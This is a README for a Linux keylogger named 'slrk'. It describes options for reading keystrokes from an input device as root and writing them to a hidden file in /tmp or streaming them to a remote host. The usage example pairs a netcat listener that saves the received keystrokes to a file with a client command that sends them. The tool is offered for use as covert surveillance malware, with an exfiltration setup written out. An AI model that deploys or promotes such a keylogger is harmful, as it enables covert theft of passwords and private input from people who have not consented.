# Simple_Local&Remote_Keylogger

Simple keylogger that runs on Linux.<br>
It must be run as root.

__________________________________________________________________________
Usage: #./slrk [OPTIONS]<br>
<br>
OPTIONS:<br>
	-d \<input-device\>:\tif not specified, the default device is '/dev/input/by-path/***kbd'<br>
	-o \<output-file\>:\tit can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'<br>
	-m remote -a \<IP-ADDR\> -p \<PORT\>: it sends all the keystrokes on the remote server located at \<IP-ADDR:PORT\><br>
<br>
EXAMPLE<br>
Server$ nc lvp 8888 > logger.txt<br><br>
Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>
__________________________________________________________________________
<br>(Keys are mapped on English keyboard)
